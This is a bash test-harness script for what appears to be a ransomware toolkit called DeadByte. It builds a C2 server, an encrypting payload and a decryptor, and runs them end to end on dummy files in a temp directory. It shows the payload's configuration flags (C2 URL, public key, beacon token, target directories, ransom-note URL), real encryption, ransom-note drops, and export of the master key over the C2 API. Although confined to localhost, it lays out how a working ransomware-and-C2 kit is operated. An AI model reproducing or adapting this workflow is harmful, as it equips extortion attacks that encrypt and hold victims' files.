#!/usr/bin/env bash
# DeadByte end-to-end lab (test files only, never real data).
set -euo pipefail
cd "$(dirname "$0")/.."
LAB="$(mktemp -d /tmp/deadbyte-lab.XXXXXX)"
DB="$LAB/c2.db"
LOG="$LAB/lab.log"
PORT="${PORT:-8443}"
ADMIN_TOK="${ADMIN_TOK:-lab-admin}"
BEACON_TOK="${BEACON_TOK:-lab-beacon}"
SECRET="${SECRET:-lab-secret}"
C2_PID=""

trap 'if [ -n "$C2_PID" ]; then kill "$C2_PID" 2>/dev/null || true; fi; rm -rf "$LAB"; echo "lab finished"' EXIT

echo "==> [0/6] building binaries (lab)"
mkdir -p "$LAB/bin" "$LAB/victim/docs" "$LAB/victim/backup" "$LAB/victim/photos"
for b in c2 payload decryptor; do
	go build -o "$LAB/bin/deadbyte-$b" "./cmd/$b"
done

echo "secret-report.txt" > "$LAB/victim/docs/report.txt"
echo "sales-sheet.csv" > "$LAB/victim/docs/data.csv"
echo "old-backup.tar.gz" > "$LAB/victim/backup/backup-2025.tgz"
for i in 1 2 3; do echo "photo-$i (simulation)" > "$LAB/victim/photos/photo$i.jpg"; done

echo "==> [1/6] generating master key and starting C2"
"$LAB/bin/deadbyte-c2" -listen "127.0.0.1:$PORT" -db "$DB" -admin-token "$ADMIN_TOK" \
	-beacon-token "$BEACON_TOK" -master-secret "$SECRET" -gen > "$LAB/pubkey.txt" 2>/dev/null
PUBKEY="$(cat "$LAB/pubkey.txt")"
"$LAB/bin/deadbyte-c2" -listen "127.0.0.1:$PORT" -db "$DB" -admin-token "$ADMIN_TOK" \
	-beacon-token "$BEACON_TOK" -master-secret "$SECRET" -beacon-interval 5 >> "$LOG" 2>&1 &
C2_PID=$!
sleep 1

echo "==> [2/6] config blob + payload dry-run"
BLOB="$("$LAB/bin/deadbyte-payload" -config-gen -c2 "http://127.0.0.1:$PORT" \
	-pubkey "$PUBKEY" -token "$BEACON_TOK" -dirs "$LAB/victim" \
	-note-url "http://127.0.0.1:$PORT")"
"$LAB/bin/deadbyte-payload" -config "$BLOB" -dry-run -force -verbose

echo "==> [3/6] running the payload (real encryption)"
"$LAB/bin/deadbyte-payload" -config "$BLOB" -force -verbose
sleep 1

echo "==> [4/6] exporting master key and restoring with the decryptor"
PRIV="$(curl -s -X POST "http://127.0.0.1:$PORT/api/v1/key/export" \
	-H "Authorization: Bearer $ADMIN_TOK" -H "X-Master-Secret: $SECRET" | \
	python3 -c 'import sys,json;print(json.load(sys.stdin)["private_key"])')"
"$LAB/bin/deadbyte-decryptor" -key "$PRIV" -dirs "$LAB/victim" -delete -verbose

echo "==> [5/6] verifying the restore"
MISSING=0
for f in docs/report.txt docs/data.csv backup/backup-2025.tgz photos/photo1.jpg photos/photo2.jpg photos/photo3.jpg; do
	if [ -f "$LAB/victim/$f" ]; then echo "  OK  $f"; else echo "  FAILED $f"; MISSING=1; fi
done
LEFT=$(find "$LAB/victim" -name '*.deadbyte' | wc -l | tr -d ' ')
echo "  remaining .deadbyte: $LEFT"
NOTE=$(find "$LAB/victim" -name 'README_DEADBYTE.txt' | wc -l | tr -d ' ')
echo "  ransom notes: $NOTE"
if [ "$MISSING" = "0" ] && [ "$LEFT" = "0" ] && [ "$NOTE" -ge 1 ]; then
	echo "==> [6/6] LAB OK (payload -> C2 -> decryptor)"
else
	echo "==> [6/6] LAB FAILED"
	exit 1
fi
